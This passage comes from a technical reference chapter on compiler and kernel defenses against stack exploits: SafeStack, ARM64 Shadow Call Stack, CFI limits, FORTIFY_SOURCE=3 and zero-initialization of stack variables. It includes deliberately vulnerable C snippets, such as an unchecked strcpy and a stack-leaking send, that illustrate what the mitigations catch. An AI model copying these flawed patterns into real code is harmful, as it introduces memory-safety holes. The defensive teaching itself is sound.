│ Unsafe stack      │ ← separate mmap region, thread-local pointer
│ (local buffers,   │   accessed via __safestack_unsafe_stack_ptr
│  arrays, VLAs)    │
└──────────────────┘

A buffer overflow on the unsafe stack corrupts only other local variables
on the unsafe stack. Return addresses and frame pointers are on the safe
stack, which is at a different (randomized) address.
```

**Compiler transformation.** SafeStack rewrites each function's prologue/epilogue:

```c
/* Original code: */
void vulnerable(char *input) {
    char buf[64];
    strcpy(buf, input);  /* overflow target */
}

/* SafeStack-transformed (conceptual): */
void vulnerable(char *input) {
    /* buf is moved to the unsafe stack */
    char *unsafe_sp = __safestack_unsafe_stack_ptr;
    unsafe_sp -= 64;
    __safestack_unsafe_stack_ptr = unsafe_sp;
    char *buf = unsafe_sp;

    strcpy(buf, input);  /* overflow stays on unsafe stack */

    /* Return address is on the safe stack, untouched */
    __safestack_unsafe_stack_ptr += 64;
}
```

**Performance overhead.** SafeStack adds approximately 0.1% overhead on SPEC CPU2006 benchmarks (Clang documentation). The cost comes from the additional thread-local storage access for each function that uses the unsafe stack.

**Limitations.**

- Does not protect against overflows that target other local variables on the unsafe stack (intra-frame corruption).
- The unsafe stack pointer is stored in TLS — if the attacker can leak or overwrite TLS, they can locate the unsafe stack.
- Only available in Clang; GCC does not implement SafeStack.
- Incompatible with some debugging tools that expect a single stack.

```bash
# Build with SafeStack
clang -fsanitize=safe-stack -o binary source.c

# Verify SafeStack is active (check for __safestack symbols)
nm binary | grep safestack
# Expected: __safestack_unsafe_stack_ptr, __safestack_init

# Check at runtime
readelf -s binary | grep -i safestack
```

### 15.2 Shadow Call Stack (ARM64)

Shadow Call Stack (SCS) is an ARM64-specific mitigation that maintains a second copy of return addresses in a separate, hidden stack. On function entry, the return address is pushed to both the regular stack and the shadow call stack. On function return, the return address is loaded from the shadow call stack, ignoring the potentially corrupted value on the regular stack.

**Implementation.** ARM64 reserves register `x18` as the shadow call stack pointer. This register is not used by the standard AArch64 calling convention (it is reserved as the "platform register"). The compiler inserts:

```asm
/* Function prologue with Shadow Call Stack: */
str x30, [x18], #8      /* push LR (return address) to shadow stack */
stp x29, x30, [sp, #-16]!   /* normal prologue: save FP and LR */

/* Function epilogue with Shadow Call Stack: */
ldp x29, x30, [sp], #16     /* normal epilogue: restore FP and LR */
ldr x30, [x18, #-8]!        /* pop LR from shadow stack (authoritative) */
ret                          /* uses x30 from shadow stack */
```

**Security properties.**

- The shadow call stack is allocated as a separate `mmap` region with PROT_READ|PROT_WRITE.
- Its address is stored only in `x18` — there is no memory-based pointer that an attacker can corrupt via a buffer overflow.
- A stack buffer overflow corrupts the LR on the regular stack, but the `ret` instruction uses the clean LR from the shadow stack.
- Combined with PAC (Pointer Authentication Codes) on ARMv8.3+, the return address is both shadowed and cryptographically signed.

**Kernel support.** The Linux kernel uses Shadow Call Stack for kernel-mode execution on ARM64 (enabled via `CONFIG_SHADOW_CALL_STACK`). The kernel reserves `x18` across all kernel code, including modules. User-space SCS requires Clang:

```bash
# Build user-space binary with Shadow Call Stack (Clang, AArch64 only)
clang --target=aarch64-linux-gnu -fsanitize=shadow-call-stack -o binary source.c

# Kernel config check
grep CONFIG_SHADOW_CALL_STACK /boot/config-$(uname -r)
# CONFIG_SHADOW_CALL_STACK=y  (enabled on most modern ARM64 distro kernels)

# Verify x18 reservation in compiled object
objdump -d binary | grep -c 'x18'
# SCS-instrumented code should show str/ldr x30, [x18] patterns
```

**Overhead.** Shadow Call Stack adds approximately 1-2% overhead in benchmarks, primarily from the additional store/load in each function prologue/epilogue.

### 15.3 Control-flow integrity interaction with stack exploits

CFI (Domain 4 §13) validates that indirect call/jump targets are legitimate function entry points. Its interaction with stack exploitation is important but nuanced.

**What CFI does protect against:**

- Stack overflow → ROP chain that uses indirect calls through corrupted function pointers (forward-edge CFI catches illegal call targets).
- Format string GOT overwrites that redirect indirect calls through the PLT (the overwritten GOT entry fails the CFI check if it is not a valid call target).

**What CFI does not protect against:**

- Classic ROP using `ret` instructions. CFI validates forward edges (calls/jumps), not backward edges (returns). Return addresses are protected by stack canaries, SafeStack, and Shadow Call Stack — not CFI.
- SROP: the `sigreturn` syscall is a legitimate kernel interface. CFI does not validate the register state restored by `sigreturn`.
- Direct overwrite of the return address followed by `ret` — this is a backward-edge attack outside CFI's scope.

**Combined defense stack.** The modern layered defense uses CFI for forward edges and one of {stack canaries, SafeStack, Shadow Call Stack, PAC} for backward edges:

```
Threat → Defense mapping:
┌────────────────────────────┬─────────────────────────────────┐
│ Attack                     │ Defense                          │
├────────────────────────────┼─────────────────────────────────┤
│ Stack overflow → ret addr  │ Stack canary, SafeStack, SCS    │
│ Stack overflow → func ptr  │ CFI (forward-edge)              │
│ Format string → GOT write  │ Full RELRO, CFI                 │
│ Format string → ret addr   │ Stack canary (pre-check)        │
│ ROP via ret                │ Shadow Call Stack, PAC           │
│ SROP                       │ SROP mitigations (see below)    │
│ Stack pivot                │ SafeStack, stack boundary checks│
│ Integer → size → overflow  │ FORTIFY_SOURCE, ASAN, UBSan    │
└────────────────────────────┴─────────────────────────────────┘
```

**SROP mitigation in modern kernels.** Linux 3.17+ includes a "seccomp-based sigreturn verification" — the kernel checks that `rt_sigreturn` is called from a legitimate signal trampoline (the `__restore_rt` address in the VDSO). A forged sigframe at an arbitrary stack location fails this check on kernels with `CONFIG_X86_64` and the VDSO-based trampoline. However, if the attacker controls the return address to point at the VDSO trampoline, the check passes.

### 15.4 FORTIFY_SOURCE level 3

GCC 12 introduced `_FORTIFY_SOURCE=3`, extending protection beyond level 2.

**Level comparison:**

| Feature | Level 1 | Level 2 | Level 3 |
|---------|---------|---------|---------|
| Compile-time size checks | Yes | Yes | Yes |
| Runtime checks (known sizes) | Yes | Yes | Yes |
| `%n` in writable format strings | Allowed | Blocked | Blocked |
| `__builtin_dynamic_object_size` | No | No | Yes |
| Checks via `alloc_size` attribute | No | No | Yes |
| Covers dynamically-sized objects | No | No | Partial |

**What changed in level 3.** The key addition is `__builtin_dynamic_object_size()`, which can determine object sizes at compile time even when the size depends on a variable (not just a constant). This enables `_chk` wrappers to validate bounds for dynamically allocated buffers when the allocation site is visible to the compiler:

```c
/* Example: FORTIFY_SOURCE level 3 catches this */
void process(int n) {
    char *buf = malloc(n);       /* size known at compile time via alloc_size */
    if (buf) {
        memcpy(buf, input, n + 1);  /* Level 3: __memcpy_chk detects off-by-one */
                                     /* Level 2: cannot determine buf size */
        free(buf);
    }
}

/* Level 3 uses __builtin_dynamic_object_size(buf, 0) which evaluates to 'n'
   because malloc is annotated with __attribute__((alloc_size(1))).
   The memcpy_chk wrapper then checks: n + 1 > n → abort. */
```

**Coverage gaps.**

- Indirect allocations (wrappers around `malloc` that are not annotated with `alloc_size`).
- Separate compilation units: if `malloc` and `memcpy` are in different translation units, the size information is lost.
- Custom allocators (slab allocators, pool allocators) that are not annotated.
- Inline assembly that manipulates buffer pointers.

```bash
# Build with FORTIFY_SOURCE=3 (requires GCC 12+ or Clang 15+)
gcc -O2 -D_FORTIFY_SOURCE=3 -o binary source.c

# Verify _FORTIFY_SOURCE level in compiled binary
# Check for _chk function calls
objdump -d binary | grep -c '_chk'

# Compare FORTIFY coverage across levels
for level in 1 2 3; do
    echo "=== FORTIFY_SOURCE=$level ==="
    gcc -O2 -D_FORTIFY_SOURCE=$level -S -o /dev/stdout source.c 2>/dev/null | \
        grep -c '_chk'
done
```

### 15.5 Auto-variable initialization — `-ftrivial-auto-var-init=zero`

Uninitialized stack variables are a perennial source of information leaks (canary values, pointers, return addresses) and control-flow hijack (using stale function pointers on the stack).

**The flag.** GCC 12+ and Clang 8+ support `-ftrivial-auto-var-init=zero`, which zero-initializes all automatic (stack) variables that are not explicitly initialized. This eliminates the entire class of uninitialized-variable information leaks.

```c
/* Without -ftrivial-auto-var-init: */
void process(int fd) {
    char buf[256];           /* contains stale stack data: canary, pointers, etc. */
    int n = read(fd, buf, sizeof(buf));
    /* If n < 256, buf[n..255] still contains stale data */
    send(sock, buf, sizeof(buf), 0);  /* leaks stack contents */
}

/* With -ftrivial-auto-var-init=zero: */
void process(int fd) {
    char buf[256];           /* compiler inserts: memset(buf, 0, 256) */
    int n = read(fd, buf, sizeof(buf));
    /* buf[n..255] are zero — no info leak */
    send(sock, buf, sizeof(buf), 0);  /* safe */
}
```

**Performance impact.** The Linux kernel has used `-ftrivial-auto-var-init=zero` since version 5.9 (`CONFIG_INIT_STACK_ALL_ZERO`). Measured overhead on kernel workloads: 0.5-1.0% (Kees Cook, Linux kernel security maintainer, 2021 measurements). The compiler is conservative — it eliminates redundant zeroing when it can prove the variable is initialized before use.

**Related options:**

| Flag | Effect |
|------|--------|
| `-ftrivial-auto-var-init=zero` | Zero-fill all uninitialized auto vars |
| `-ftrivial-auto-var-init=pattern` | Fill with `0xAA` pattern (debug — makes stale use crash) |
| `-enable-trivial-auto-var-init-zero-knowing-it-will-be-removed-from-clang` | Clang <16 required this flag alongside `=zero` |
| `CONFIG_INIT_STACK_ALL_ZERO` | Kernel config enabling zero-init for all kernel stack vars |
| `CONFIG_GCC_PLUGIN_STRUCTLEAK_BYREF_ALL` | Older kernel plugin-based approach (pre-5.9) |

```bash
# Build with auto-variable initialization
gcc -O2 -ftrivial-auto-var-init=zero -o binary source.c

# Clang (version < 16 needs the extra flag):
clang -O2 -ftrivial-auto-var-init=zero \
    -enable-trivial-auto-var-init-zero-knowing-it-will-be-removed-from-clang \
    -o binary source.c

# Clang 16+:
clang -O2 -ftrivial-auto-var-init=zero -o binary source.c

# Verify at assembly level — look for zeroing instructions before variable use
objdump -d binary | grep -A5 'sub.*rsp' | grep -E 'xor|mov.*\$0x0|rep stos'

# Kernel configuration check
grep CONFIG_INIT_STACK_ALL_ZERO /boot/config-$(uname -r)
# CONFIG_INIT_STACK_ALL_ZERO=y
```

**Combined hardening flags — complete compiler defense stack:**

```bash
# Production hardening CFLAGS (2024 best practice, GCC 12+ / Clang 15+)
HARDENING_CFLAGS="
    -D_FORTIFY_SOURCE=3
    -fstack-protector-strong
    -fstack-clash-protection
    -ftrivial-auto-var-init=zero
    -fcf-protection=full              # Intel CET (x86_64)
    -mbranch-protection=standard      # ARM64 PAC+BTI
    -fPIE -pie                         # ASLR for executables
    -Wl,-z,relro,-z,now               # Full RELRO
    -Wl,-z,noexecstack                # NX stack
    -Wl,-z,separate-code              # separate code/data segments
    -Wformat=2 -Wformat-security
    -Wsign-conversion -Wconversion
"

# Verification: check all defenses are present in compiled binary
checksec --file=binary
# Expected output:
# RELRO           FULL
# STACK CANARY    Canary found
# NX              NX enabled
# PIE             PIE enabled
# FORTIFY         Enabled (level 3)
```

---

## 16. Cross-references

**To Domain 1 (binary formats):** GOT overwriting via format strings targets the `.got.plt` entries described in Domain 1, Chapter 1A §11. Full RELRO (Chapter 1B §5.1) makes the GOT read-only, defeating format-string GOT writes. The stack canary is initialized from `AT_RANDOM` (Chapter 1B §10.2) and stored in the TCB at `fs:0x28`.

**To Domain 2 (process memory):** Stack placement, `RLIMIT_STACK`, `MAP_GROWSDOWN`, and the stack gap (Chapter 2A §4) are the kernel-side mechanisms that stack clash attacks target. `sigreturn` dispatch (Chapter 2B §1) is the kernel mechanism that SROP exploits.

**To Domain 4 (code reuse):** Stack overflow is the classic entry point for ROP chains (Domain 4 §2). SROP (Domain 4 §7) uses a crafted `sigframe` on the stack. Canary brute-force in forking servers (Domain 4 §15.5) exploits the fork-shares-canary property. Stack pivoting (Domain 4 §2.4) follows from stack overflow when the overflowed buffer is too small for a full chain.

**To Chapter 3B (heap exploitation):** Integer errors are the most common root cause of heap-based vulnerabilities — an integer overflow in a size calculation leads to a too-small heap allocation, followed by a heap buffer overflow. The format-string write primitive can target heap metadata as well as the GOT.
